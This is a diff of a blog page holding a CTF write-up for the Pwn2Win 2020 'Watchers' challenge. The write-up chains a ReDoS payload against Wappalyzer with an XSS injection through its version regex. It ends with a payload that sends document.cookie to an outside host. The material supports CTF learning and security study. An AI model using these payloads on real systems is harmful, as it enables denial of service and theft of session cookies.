@@ -3,7 +3,7 @@
 <head>
   <link href="https://gmpg.org/xfn/11" rel="profile">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.83.1" />
+  <meta name="generator" content="Hugo 0.86.1" />
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -53,13 +53,13 @@
   <h1>Pwn2win 2020 Watchers: Write-Up</h1>
   <time datetime=2020-06-03T14:09:33-0300 class="post-date">Wed, Jun 3, 2020</time>
   <p>Hi folks, this is a write up for my challenge in this year&rsquo;s Pwn2Win edition, the environment docker is available at <a href="https://github.com/pwn2winctf/challenges-2020/tree/master/web-Watchers">pwn2win repository</a>, hope you enjoy!</p>
-<p><img src="https://i.imgur.com/n9rjvmf.png" alt="Challenge"></p>
+<p><img src="images/n9rjvmf.png" alt="Challenge"></p>
 <p><strong>Description:</strong> Welcome to Static Web Host! During all these years of static website development, Rebellious Fingers found out that the biggest hole in our security is the use of insecure third-party applications. To help our members mitigate this problem, and not be compromised by our enemies, we decided to implement a third-party app to help them identify which technologies their pages are running so they can check whether there is anything vulnerable before deployment.</p>
 <p><strong>This challenge was only solved by <a href="https://twitter.com/PlaidCTF">@PlaidCTF</a> and  <a href="https://twitter.com/justCatTheFish">@JustCatTheFish</a> (which wrote an <a href="https://github.com/justcatthefish/ctf-writeups/tree/master/2020-05-31-Pwn2win/web-watcher">amazing writeup</a>). Congratulations!</strong></p>
 <h2 id="technical-overview">Technical Overview</h2>
 <p>The objective here is to find and exploit a 0day in a tool called <a href="https://github.com/AliasIO/wappalyzer">Wappalyzer</a> (version 6.0.2), which runs a lot of regex expressions against web pages to identify which technologies are running. As you can see <a href="https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454">here</a>, regex isn&rsquo;t the proper way to parse HTML leading to problems like the ones shown in this challenge.</p>
 <p>With further analysis, this tool opens a web page (using puppeteer) and splits it into different groups. Such as: meta tags, HTML code, script tags, javascript variables, HTTP headers, etc. Then, each group is parsed by its group corresponding to the regular expression in source code, like the example:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
   <span style="color:#f92672">&#34;Vue.js&#34;</span>: {
     <span style="color:#f92672">&#34;cats&#34;</span>: [
       <span style="color:#ae81ff">12</span>
@@ -77,7 +77,7 @@
   }
 }
 </code></pre></div><p>Knowing this, we can see how easily we could trick this tool into detecting a <strong>Vuejs</strong> environment by just inserting the tag <code>&lt;a data-v-pwn2win&gt;</code> into our page:</p>
-<p><img src="https://i.imgur.com/kN0MNlq.png" alt="Vuejs being detected"></p>
+<p><img src="images/kN0MNlq.png" alt="Vuejs being detected"></p>
 <h2 id="practical-overview">Practical Overview</h2>
 <p>The challenge has three pages:</p>
 <p><strong>Main:</strong> This page is an HTML page editor that allows the user to change code from three different tabs: <em>home</em>, <em>about</em>, and <em>contact</em>. The user can change everything on the page except for a meta tag with <em>Content-Security-Policy</em> setting the default source to none. There is also a weaponlyzer button that sends this page&rsquo;s content to the server and displays the wappalyzer result after executing it in all these pages.<br>
@@ -90,11 +90,11 @@
 <li>Refresh meta tag was filtered out (although there was an unintended bypass to it, exploitation wasn&rsquo;t possible due to the resources load time limit I set in wappalyzer)</li>
 <li>There is no way to bypass the CSP directives</li>
 </ol>
-<p><img src="https://i.imgur.com/HChTHuQ.png" alt=""></p>
+<p><img src="images/HChTHuQ.png" alt=""></p>
 <h2 id="solving-the-challenge">Solving the challenge</h2>
 <p>Now that we had a general overview of this challenge, we can start to think of how we can solve it.</p>
 <p>The code provided shows that it will create a page for each tab in the index editor. Then, it will run every tab against the wappalyzer tool, display the results, and delete them. Except if the wappalyzer takes more than 20 seconds to run, then it will return an error with the page URL without deleting the file. As shown in the code bellow:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; $i<span style="color:#f92672">++</span>) {
     $output <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;timeout -k 3s 20s wappalyzer -w 8 &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">escapeshellarg</span>(<span style="color:#a6e22e">escapeshellcmd</span>($targets[$i])));
     $json <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($output, <span style="color:#66d9ef">true</span>);
@@ -139,13 +139,13 @@
 <li>Do something with the URL of our file to send it to the admin</li>
 </ol>
 <p>To accomplish the first step, we need to go deeper into how the wappalyzer internals works: <strong>regex processing</strong>. By reading its source code, we can look for problematic regex structures where it&rsquo;s possible to trigger a catastrophic regression. Cleaning the <a href="https://github.com/AliasIO/wappalyzer/blob/master/src/apps.json">regex file</a> and running all regexes through a tool like <a href="ttps://github.com/2bdenny/ReScue">ReScue</a> you should be able to find, at least, two different payloads that completely breaks wappalyzer:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GENERATOR&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IMPERIA 46197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197966228761662296:&#34;</span>/&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GENERATOR&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IMPERIA 46197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197966228761662296:&#34;</span>/&gt;
 &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..c.c..j..jskhtlcnipmos.cdnjs.cdnjs.dnjs.cdnjs.cloudflar.jsjs.cloudf&#39;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
 </code></pre></div><p>(or more, as <a href="https://twitter.com/justCatTheFish">@JustCatTheFish</a>  describes a different payoad in their <a href="https://github.com/justcatthefish/ctf-writeups/tree/master/2020-05-31-Pwn2win/web-watcher">writeup</a>).</p>
 <p>Running weaponlyzer function with one of these two tags on our page, leads to the described error message with our home URL. Just as illustrated below:</p>
-<p><img src="https://i.imgur.com/ND1jM8o.png" alt=""></p>
+<p><img src="images/ND1jM8o.png" alt=""></p>
 <p>Okay, now that we can create files in the server, we have a URL to send to the bot, but we still don&rsquo;t know what to do with it. To achieve this goal, let&rsquo;s go back to the technical overview, where I point out that we can force some wappalyzer responses. In that example, I choose Vue to demonstrate my point, but let&rsquo;s try something different now, using the <strong>AMP Plugin</strong> shown below:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JSON" data-lang="JSON">{
   <span style="color:#f92672">&#34;AMP Plugin&#34;</span>: {
     <span style="color:#f92672">&#34;cats&#34;</span>: [
       <span style="color:#ae81ff">1</span>,
@@ -160,11 +160,11 @@
   },
 }
 </code></pre></div><p>This version indicated in the regex means that it will be replaced by the first <code>\1</code> group in the wappalyzer response. Also, since the version is grouped by a <code>(\\d+\\.\\d+.*)</code>, it means that we can change the value to an arbitrary text using a special crafted meta tag:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GENERATOR&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AMP Plugin v1.2.a my arbitrary text&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GENERATOR&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AMP Plugin v1.2.a my arbitrary text&#34;</span>&gt;
 </code></pre></div><p>Resulting in:</p>
-<p><img src="https://i.imgur.com/BgmupTS.png" alt=""></p>
+<p><img src="images/BgmupTS.png" alt=""></p>
 <p>We have a point of arbitrary text injection. It may be vulnerable to XSS, but trying to enter the value <code>&lt;meta name=&quot;GENERATOR&quot; content=&quot;AMP Plugin v1.2.a &lt;svg/onload=alert(1)&gt;&quot;&gt;</code> didn&rsquo;t work. Maybe this isn&rsquo;t vulnerable to XSS? The answer is in the <a href="https://github.com/pwn2winctf/challenges-2020/blob/master/web-Watchers/deploy/watchers/js/app.9c65c4c0.js.map">VueJS .map file</a>, which isn&rsquo;t deleted by default. Therefore we can easily retrieve the VueJS original code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">md-list</span> <span style="color:#a6e22e">v-for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;(value, name) in weapon.data&#34;</span> <span style="color:#a6e22e">v-bind:key</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;value&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">md-list</span> <span style="color:#a6e22e">v-for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;(value, name) in weapon.data&#34;</span> <span style="color:#a6e22e">v-bind:key</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;value&#34;</span>&gt;
     &lt;<span style="color:#f92672">md-list-item</span> <span style="color:#a6e22e">v-for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data in value&#34;</span> <span style="color:#a6e22e">v-bind:key</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data&#34;</span>&gt;{{data.name}}
         &lt;<span style="color:#f92672">code</span> <span style="color:#a6e22e">v-html</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data.version&#34;</span>&gt;&lt;/<span style="color:#f92672">code</span>&gt;
     &lt;/<span style="color:#f92672">md-list-item</span>&gt;
@@ -177,19 +177,19 @@
 <li><code>1.</code> and <code>2.</code> addresses all possible regexes with <code>(.*)</code> or <code>(.+)</code> groups for version substitution, so we need to find another way to do that. (Actually, a new release of wappalyzer one day before pwn2win introduced one new tag that fits this category without using javascript or meta tag, as shown in <a href="https://github.com/justcatthefish/ctf-writeups/tree/master/2020-05-31-Pwn2win/web-watcher">JustCatTheFish writeup</a>)</li>
 </ol>
 <p>To bypass this problem, I looked for another way of matching strings, the <code>[^something]</code> (everything different from something). And I found a perfect match: <code>chartjs\\.org/dist/([\\d.]+(?:-[^/]+)?|master|latest)/Chart.*\\.js\\;version:\\1</code> in which the <code>(?:-[^/]+)</code> part of the subtitution group accepts all characteres different from a <code>/</code>, meaning I could exploit it using the following payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:chartjs.org/dist/45544-aaaaaaaaaaa&lt;img src=x onerror=&#39;alert(1)&#39;&gt;/Chart.asdasdasdasdasd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p><img src="https://i.imgur.com/7DINx6d.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:chartjs.org/dist/45544-aaaaaaaaaaa&lt;img src=x onerror=&#39;alert(1)&#39;&gt;/Chart.asdasdasdasdasd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</code></pre></div><p><img src="images/7DINx6d.png" alt=""></p>
 <h2 id="put-it-all-together">Put it all together</h2>
 <p>Now that we can create persistent files and trigger XSS, we just need to find a way to make the XSS payload execute before the ReDoS crashes wappalyzer. Fortunately, we have more than one page to edit! As soon as we receive the URL in the error message caused by the ReDoS crash, it is possible to notice that it comes in the format: <code>hash-home.html</code>, which we can just substitute to <code>hash-about.html</code> or <code>hash-contact.html</code>. We could put the ReDoS in the <strong>home</strong> page and the XSS in the <strong>about</strong> or <strong>contact</strong> page, then send the one that contains the XSS to the admin.</p>
 <p>The steps to execute the attack described above are:</p>
 <ol>
 <li>Place in the home tab the ReDoS payload:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GENERATOR&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IMPERIA 46197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197966228761662296:&#34;</span>/&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GENERATOR&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IMPERIA 46197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197946197966228761662296:&#34;</span>/&gt;
 </code></pre></div><ol start="2">
 <li>Place in the about tab the XSS snippet:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:chartjs.org/dist/45544-aaaaaaaaaaa&lt;img src=x onerror=&#39;location=`https:abrasax.club?${document.cookie}`&#39;&gt;/Chart.asdasdasdasdasd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:chartjs.org/dist/45544-aaaaaaaaaaa&lt;img src=x onerror=&#39;location=`https:abrasax.club?${document.cookie}`&#39;&gt;/Chart.asdasdasdasdasd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
 </code></pre></div><ol start="3">
 <li>Click in wappalyzer button, wait 20 seconds to get the URL back.</li>
 <li>Send the XSS URL to the admin (<code>-about.html</code>)</li>
